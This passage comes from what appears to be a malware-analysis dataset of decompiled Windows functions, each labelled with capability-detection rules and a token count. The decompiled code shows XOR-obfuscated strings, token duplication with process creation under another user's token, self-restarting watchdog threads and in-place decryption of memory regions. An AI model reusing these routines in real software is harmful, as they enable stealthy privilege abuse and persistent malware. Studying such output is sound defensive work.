var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uint var_40h;\n    uchar var_3ch;\n    int32_t ProcessHandle;\n    uint pSid;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    var_178h = 0;\n    var_1b4h = 0;\n    TokenHandle = 0;\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority._0_1_ = 0;\n    pIdentifierAuthority._1_1_ = 0;\n    pIdentifierAuthority._2_1_ = 0;\n    pIdentifierAuthority._3_1_ = 0;\n    var_7ch = 0;\n    var_7bh = 0x10;\n    ProcessHandle = 0;\n    piVar3 = arg_ch;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    puVar4 = &var_1f8h;\n    for (iVar2 = 0x44; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_1a8h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &psz1;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_e4h._0_1_ = 0x52;\n    var_e4h._1_1_ = 0x36;\n    var_e4h._2_1_ = 0x7d;\n    var_e4h._3_1_ = 0x4f;\n    var_e0h = 0x62;\n    var_dfh = 0x72;\n    var_deh = 0x40;\n    var_ddh = 0x50;\n    var_dch = 0x38;\n    var_dbh = 0x4f;\n    var_dah = 10;\n    var_d9h = 0x36;\n    var_d8h = 0x29;\n    var_d7h = 0x4f;\n    var_d6h = 0x35;\n    var_d5h = 0x72;\n    var_d4h = 0x36;\n    var_d3h = 0x50;\n    var_68h._0_1_ = 0x72;\n    var_68h._1_1_ = 0x36;\n    var_68h._2_1_ = 0x50;\n    var_68h._3_1_ = 0x4f;\n    var_64h = 0x4f;\n    fcn.004012a0(0x24);\n    for (var_8h = 0; var_8h < 0x12; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_e4h + var_8h) ^ *(&var_68h + var_8h % 5));\n    }\n    var_110h._0_1_ = 0x10;\n    var_110h._1_1_ = 0x4d;\n    var_110h._2_1_ = 0x4e;\n    var_110h._3_1_ = 0x72;\n    var_10ch = 0x6e;\n    var_10bh = 0x30;\n    var_10ah = 0x3e;\n    var_109h = 99;\n    var_108h = 0x17;\n    var_107h = 0x43;\n    var_106h = 0x42;\n    var_105h = 0x4d;\n    var_104h = 0x15;\n    var_103h = 0x72;\n    var_102h = 0x2a;\n    var_101h = 0x30;\n    var_100h = 0x2e;\n    var_ffh = 99;\n    var_feh = 0x17;\n    var_fdh = 0x43;\n    var_fch = 0x30;\n    var_fbh = 0x4d;\n    var_60h._0_1_ = 0x30;\n    var_60h._1_1_ = 0x4d;\n    var_60h._2_1_ = 99;\n    var_60h._3_1_ = 0x72;\n    var_5ch = 0x43;\n    fcn.004012a0(0x2c);\n    for (var_ch = 0; var_ch < 0x16; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_110h + var_ch) ^ *(&var_60h + var_ch % 5));\n    }\n    (*_sym.imp.SHLWAPI.dll_StrCpyW)(&psz1, *0x436b44);\n    uVar1 = fcn.00401270();\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(&psz1, uVar1);\n    uVar1 = fcn.00401270();\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(&psz1, uVar1);\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, dwProcessId);\n    var_bch._0_1_ = 0xd;\n    var_bch._1_1_ = 0x51;\n    var_bch._2_1_ = 0x36;\n    var_bch._3_1_ = 0x5a;\n    var_b8h = 0x3f;\n    var_b7h = 0;\n    var_b6h = 0x55;\n    var_b5h = 6;\n    var_b4h = 0x6a;\n    var_b3h = 0x50;\n    var_b2h = 0x36;\n    var_b1h = 0;\n    var_b0h = 0x66;\n    var_90h._0_1_ = 0x66;\n    var_90h._1_1_ = 0x34;\n    var_90h._2_1_ = 0x44;\n    var_90h._3_1_ = 0x34;\n    var_8ch = 0x5a;\n    var_8bh = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_10h = 0; var_10h < 0xd; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_bch + var_10h) ^ *(&var_90h + var_10h % 6));\n    }\n    if (ProcessHandle != 0) {\n        var_ach._0_1_ = 0xd;\n        var_ach._1_1_ = 0x51;\n        var_ach._2_1_ = 0x36;\n        var_ach._3_1_ = 0x5a;\n        var_a8h = 0x3f;\n        var_a7h = 0;\n        var_a6h = 0x55;\n        var_a5h = 6;\n        var_a4h = 0x6a;\n        var_a3h = 0x50;\n        var_a2h = 0x36;\n        var_a1h = 0;\n        var_a0h = 0x66;\n        var_88h[0] = 0x66;\n        var_88h[1] = 0x34;\n        var_88h[2] = 0x44;\n        var_88h[3] = 0x34;\n        var_84h = 0x5a;\n        var_83h = 0x6c;\n        fcn.004012a0(0xd);\n        for (var_14h = 0; var_14h < 0xd; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, *(&var_ach + var_14h) ^ var_88h[var_14h % 6]);\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &TokenInformation);\n        if (iVar2 != 0) {\n            var_144h._0_1_ = 0x21;\n            var_144h._1_1_ = 0x22;\n            var_144h._2_1_ = 0x16;\n            var_144h._3_1_ = 0x16;\n            var_140h = 6;\n            var_13fh = 0x1d;\n            var_13eh = 0x2f;\n            var_13dh = 0x14;\n            var_13ch = 0x1a;\n            var_13bh = 0x10;\n            var_13ah = 0x1b;\n            var_139h = 0x33;\n            var_138h = 0x2a;\n            var_137h = 0x2a;\n            var_136h = 0xd;\n            var_135h = 9;\n            var_134h = 0x39;\n            var_133h = 0x35;\n            var_132h = 0xe;\n            var_131h = 2;\n            var_130h = 0x1b;\n            var_12fh = 0x3f;\n            var_12eh = 0x28;\n            var_12dh = 0xd;\n            var_12ch = 99;\n            var_58h._0_1_ = 0x6f;\n            var_58h._1_1_ = 0x56;\n            var_58h._2_1_ = 0x47;\n            var_58h._3_1_ = 99;\n            var_54h = 99;\n            fcn.004012a0(0x19);\n            for (var_18h = 0; var_18h < 0x19; var_18h = var_18h + 1) {\n                fcn.00401280(var_18h, *(&var_144h + var_18h) ^ *(&var_58h + var_18h % 5));\n            }\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.004056c0(0);\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &TokenHandle);\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(TokenHandle, 0xc, TokenInformation, 4);\n                    iVar2 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar2 != 0) {\n                        var_1a4h = 0x20;\n                        var_1a8h = pSid;\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(TokenHandle, 0x19, &var_1a8h, iVar2 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_1a0h = 0;\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(TokenHandle, 0x1b, &var_1a0h, 4);\n                    iVar2 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, TokenHandle, 1);\n                    if (iVar2 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_178h = var_178h | 0x400;\n                    }\n                    var_1f8h = 0x44;\n                    var_164h._0_1_ = 0x14;\n                    var_164h._1_1_ = 0x6f;\n                    var_164h._2_1_ = 0xc;\n                    var_164h._3_1_ = 0x53;\n                    var_160h = 0;\n                    var_15fh = 0x38;\n                    var_15eh = 0x10;\n                    var_15dh = 0x6f;\n                    var_15ch = 0x11;\n                    var_15bh = 0x53;\n                    var_15ah = 0xf;\n                    var_159h = 0x38;\n                    var_158h = 0x53;\n                    var_157h = 0x6f;\n                    var_156h = 0x39;\n                    var_155h = 0x53;\n                    var_154h = 10;\n                    var_153h = 0x38;\n                    var_152h = 6;\n                    var_151h = 0x6f;\n                    var_150h = 3;\n                    var_14fh = 0x53;\n                    var_14eh = 0xf;\n                    var_14dh = 0x38;\n                    var_14ch = 0x16;\n                    var_14bh = 0x6f;\n                    var_14ah = 9;\n                    var_149h = 0x53;\n                    var_148h = 0x1a;\n                    var_147h = 0x38;\n                    var_146h = 99;\n                    var_145h = 0x6f;\n                    var_78h[0] = 99;\n                    var_78h[1] = 0x6f;\n                    var_78h[2] = 0x65;\n                    var_78h[3] = 0x53;\n                    var_74h = 0x6e;\n                    var_73h = 0x38;\n                    fcn.004012a0(0x40);\n                    for (var_1ch = 0; var_1ch < 0x20; var_1ch = var_1ch + 1) {\n                        fcn.00401280(var_1ch, *(&var_164h + var_1ch) ^ var_78h[var_1ch % 6]);\n                    }\n                    var_128h._0_1_ = 7;\n                    var_128h._1_1_ = 0x43;\n                    var_128h._2_1_ = 0x1e;\n                    var_128h._3_1_ = 0x35;\n                    var_124h = 0x24;\n                    var_123h = 0x74;\n                    var_122h = 0x2b;\n                    var_121h = 0x68;\n                    var_120h = 0x5a;\n                    var_11fh = 0x47;\n                    var_11eh = 7;\n                    var_11dh = 0x43;\n                    var_11ch = 0x1c;\n                    var_11bh = 0x35;\n                    var_11ah = 0x69;\n                    var_119h = 0x74;\n                    var_118h = 0x26;\n                    var_117h = 0x68;\n                    var_116h = 0x4d;\n                    var_115h = 0x47;\n                    var_114h = 0x11;\n                    var_113h = 0x43;\n                    var_112h = 0x68;\n                    var_111h = 0x35;\n                    var_40h._0_1_ = 0x74;\n                    var_40h._1_1_ = 0x43;\n                    var_40h._2_1_ = 0x68;\n                    var_40h._3_1_ = 0x35;\n                    var_3ch = 0x47;\n                    fcn.004012a0(0x30);\n                    for (var_20h = 0; var_20h < 0x18; var_20h = var_20h + 1) {\n                        fcn.00401280(var_20h, *(&var_128h + var_20h) ^ *(&var_40h + var_20h % 5));\n                    }\n                    var_1f0h = fcn.00401270();\n                    var_1c8h._0_2_ = 0;\n                    var_1cch = 1;\n                    var_d0h[0] = 0x1a;\n                    var_d0h[1] = 0x78;\n                    var_d0h[2] = 0x67;\n                    var_d0h[3] = 0x74;\n                    var_cch = 6;\n                    var_cbh = 0x6c;\n                    var_cah = 0x1a;\n                    var_c9h = 0x78;\n                    var_c8h = 0x6e;\n                    var_c7h = 0x74;\n                    var_c6h = 0x55;\n                    var_c5h = 0x6c;\n                    var_c4h = 0x1d;\n                    var_c3h = 0x78;\n                    var_c2h = 0x31;\n                    var_c1h = 0x74;\n                    var_c0h = 0x75;\n                    var_bfh = 0x6c;\n                    var_70h[0] = 0x38;\n                    var_70h[1] = 0x78;\n                    var_70h[2] = 0x42;\n                    var_70h[3] = 0x74;\n                    var_6ch = 0x75;\n                    var_6bh = 0x6c;\n                    fcn.004012a0(0x24);\n                    for (var_24h = 0; var_24h < 0x12; var_24h = var_24h + 1) {\n                        fcn.00401280(var_24h, var_d0h[var_24h] ^ var_70h[var_24h % 6]);\n                    }\n                    var_1b0h = (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                                         (TokenHandle, 0, &psz1, 0, 0, 0, var_178h, var_30h, 0, &var_1f8h, arg_ch);\n                    var_f8h[0] = 0xc;\n                    var_f8h[1] = 0x6c;\n                    var_f8h[2] = 0x42;\n                    var_f8h[3] = 0x75;\n                    var_f4h = 0x3d;\n                    var_f3h = 0x74;\n                    var_f2h = 0x19;\n                    var_f1h = 0x33;\n                    var_f0h = 2;\n                    var_efh = 0x53;\n                    var_eeh = 0x1d;\n                    var_edh = 0x6c;\n                    var_ech = 0x5d;\n                    var_ebh = 0x75;\n                    var_eah = 0x3c;\n                    var_e9h = 0x74;\n                    var_e8h = 0x6c;\n                    var_e7h = 0x33;\n                    var_50h._0_1_ = 0x74;\n                    var_50h._1_1_ = 0x6c;\n                    var_50h._2_1_ = 0x33;\n                    var_50h._3_1_ = 0x75;\n                    var_4ch = 0x53;\n                    fcn.004012a0(0x24);\n                    for (var_28h = 0; var_28h < 0x12; var_28h = var_28h + 1) {\n                        fcn.00401280(var_28h, var_f8h[var_28h] ^ *(&var_50h + var_28h % 5));\n                    }\n                    if (*arg_ch != 0) {\n                        var_9ch._0_1_ = 0x2a;\n                        var_9ch._1_1_ = 0x1c;\n                        var_9ch._2_1_ = 0x5f;\n                        var_9ch._3_1_ = 0x35;\n                        var_98h = 0x57;\n                        var_97h = 0x16;\n                        var_96h = 0xc;\n                        var_95h = 0x5c;\n                        var_94h = 10;\n                        var_93h = 0x36;\n                        var_48h._0_1_ = 0x78;\n                        var_48h._1_1_ = 0x68;\n                        var_48h._2_1_ = 0x33;\n                        var_48h._3_1_ = 0x67;\n                        var_44h = 0x36;\n                        fcn.004012a0(10);\n                        for (var_2ch = 0; var_2ch < 10; var_2ch = var_2ch + 1) {\n                            fcn.00401280(var_2ch, *(&var_9ch + var_2ch) ^ *(&var_48h + var_2ch % 5));\n                        }\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*arg_ch, 0x201eb, &hObject);\n                        if (iVar2 != 0) {\n                            fcn.004056c0(hObject);\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch[1]);\n                        fcn.004012d0();\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n            fcn.004012d0();\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n        fcn.004012d0();\n    }\n    var_1ach = *arg_ch;\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_1ach;\n}\n",
        "token_count": 6976
    },
    "00409400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409400(int32_t arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_268h;\n    uint var_60h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_3ch;\n    int32_t var_34h;\n    int32_t iStack52;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int16_t var_12h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_50h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_ch = 0;\n    var_4h = 0;\n    var_24h = 0;\n    var_18h = 0;\n    puVar4 = &var_60h;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_4ch;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_268h;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_34h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    if (*0x436b04 == 0) {\n        var_ch = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100400, 0, *(arg_8h + 8));\n        if (var_ch == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n        }\n        else {\n            if (*0x436b54 == 0) {\n                var_4h = fcn.004084e0(&var_60h);\n                var_3ch = *0x4367bc;\n                var_48h = *0x4367c0 >> 0x1f;\n                var_4ch = *0x4367c0;\n            }\n            else {\n                var_4h = fcn.00408670(*(arg_8h + 8), &var_60h);\n                iVar3 = fcn.004162b0(*0x436b44, &var_20h, &var_1ch);\n                if (iVar3 == 0) {\n                    var_3ch = var_1ch;\n                    var_48h = var_20h >> 0x1f;\n                    var_4ch = var_20h;\n                }\n            }\n            if (var_4h == 0) {\n                var_10h = &var_268h;\n                var_28h = &var_268h + 2;\n                do {\n                    var_12h = *var_10h;\n                    var_10h = var_10h + 2;\n                } while (var_12h != 0);\n                var_2ch = var_10h - var_28h >> 1;\n                if (var_2ch != 0) {\n                    uVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_268h);\n                    (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar1);\n                }\n            }\n            else {\n                for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n                    if (*(var_8h * 4 + 0x4369d8) == 0) {\n                        var_18h = var_8h;\n                        break;\n                    }\n                }\n                *(var_18h * 4 + 0x4369d8) = var_4h;\n                fcn.00404860(var_4h, &var_268h);\n                var_34h = var_4h;\n                iStack52 = var_ch;\n                (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &var_34h, 0, 0xffffffff);\n                *(var_18h * 4 + 0x4369d8) = 0;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(200);\n                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar2);\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_4h, 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(var_ch, &var_24h);\n                if ((iVar3 != 0) && (var_24h == 0x103)) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409400, arg_8h, 0, 0);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n            }\n            (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n        }\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    return 0;\n}\n",
        "token_count": 1366
    },
    "00409680": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409680(uint noname_0, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint noname_4, int32_t arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_10ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puVar3 = &var_10ch;\n    for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_314h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if ((*0x436b54 != 0) && (arg_ch == 0x74fc6984)) {\n        *0x4367c4 = 1;\n        iVar2 = fcn.00405160(arg_10h);\n        if (iVar2 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            *(var_4h + 8) = arg_10h;\n            uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409400, var_4h, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n        }\n    }\n    if (((arg_1ch != 1) && (iVar2 = fcn.0041e180(arg_ch),  iVar2 != 0)) && (arg_10h != *0x436b48)) {\n        if (arg_ch == -0x37b0bf10) {\n            puVar3 = &var_10ch;\n            for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            fcn.004055d0(arg_14h, &var_10ch);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_10ch);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_10ch);\n                var_8h = fcn.0041e850(&var_10ch, uVar1);\n                if (var_8h == -0x37b0bf10) {\n                    return 1;\n                }\n            }\n        }\n        iVar2 = fcn.00405210(arg_10h);\n        if (iVar2 == 0) {\n            puVar3 = &var_314h;\n            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = fcn.00404860(arg_10h, &var_314h);\n            if (iVar2 != 0) {\n                if (*0x436b54 == 0) {\n                    iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_314h, 0x4367c8);\n                    if (iVar2 == 0) {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405460, arg_10h, 0, 0);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n                    }\n                }\n                else {\n                    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405460, arg_10h, 0, 0);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n                }\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 963
    },
    "00409b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409b30(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint ARG_0;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = arg_8h;\n    var_48h._0_1_ = 0x74;\n    var_48h._1_1_ = 0x35;\n    var_48h._2_1_ = 0x18;\n    var_48h._3_1_ = 0x65;\n    var_44h = 0x34;\n    var_43h = 0x4b;\n    var_42h = 0x75;\n    var_41h = 0x35;\n    var_40h = 0x1d;\n    var_3fh = 0x65;\n    var_3eh = 0x30;\n    var_3dh = 0x4b;\n    var_3ch = 0xf;\n    var_3bh = 0x35;\n    var_3ah = 0x3b;\n    var_39h = 0x65;\n    var_38h = 8;\n    var_37h = 0x4b;\n    var_36h = 0x60;\n    var_35h = 0x35;\n    var_34h = 0x6c;\n    var_33h = 0x65;\n    var_30h[0] = 0x38;\n    var_30h[1] = 0x35;\n    var_30h[2] = 0x6c;\n    var_30h[3] = 0x65;\n    var_2ch = 0x61;\n    var_2bh = 0x4b;\n    fcn.004012a0(0x2c);\n    for (var_ch = 0; var_ch < 0x16; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_48h + var_ch) ^ var_30h[var_ch % 6]);\n    }\n    if ((*0x436b54 == 0) && (*var_1ch == 0x20)) {\n        puVar3 = 0x4367c8;\n        for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        ARG_0 = 0x4367c8;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00404860(uVar1, ARG_0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_18h[1] = var_1ch[3];\n        *var_18h = var_1ch[2];\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_18h[2] = iVar2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409400, var_18h, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    }\n    for (var_10h = 0; var_10h < 0x5e00; var_10h = var_10h + 1) {\n        \"sZvkIKT0uTIM>\"[var_10h + 0xc] = \"sZvkIKT0uTIM>\"[var_10h + 0xc] ^ \"sZvkIKT0uTIM>\"[var_10h % 0xc];\n    }\n    for (var_14h = 0; var_14h < 0x8000; var_14h = var_14h + 1) {\n        *(var_14h + 0x42e0f8) = *(var_14h + 0x42e0f8) ^ *(var_14h % 0xc + 0x4360f8);\n    }\n    for (var_4h = 0; var_4h < 0x5e00; var_4h = var_4h + 1) {\n        if (*(\"sZvkIKT0uTIM>\" + var_4h + 0xc) == 0x11223344) {\n            *(\"sZvkIKT0uTIM>\" + var_4h + 0xc) = 0x12;\n        }\n        else if (*(\"sZvkIKT0uTIM>\" + var_4h + 0xc) == 0x55667788) {\n            *(\"sZvkIKT0uTIM>\" + var_4h + 0xc) = 0x13;\n        }\n    }\n    for (var_8h = 0; var_8h < 0x8000; var_8h = var_8h + 1) {\n        if (*(var_8h + 0x42e0f8) == 0x11223344) {\n            *(var_8h + 0x42e0f8) = 0x12;\n        }\n        else if (*(var_8h + 0x42e0f8) == 0x55667788) {\n            *(var_8h + 0x42e0f8) = 0x13;\n        }\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409850, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    if (*0x436b54 != 0) {\n        *0x4367c4 = 0;\n        fcn.00417510(fcn.00409680, 1);\n        if (*0x4367c4 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n            var_20h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            *(var_20h + 8) = uVar1;\n            uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409400, var_20h, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n        }\n    }\n    while (*0x436b04 == 0) {\n        fcn.00417510(fcn.00409680, 0);\n        if (*0x436b54 != 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(0x1e);\n    }\n    var_28h = 0;\n    fcn.004012d0();\n    return var_28h;\n}\n",
        "token_count": 1872
    },
    "00409ea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a121)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409ea0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint arg_ch;\n    uint var_68h;\n    uint var_5ch;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uint var_18h;\n    uint lpflOldProtect;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puVar4 = &var_2ch;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n  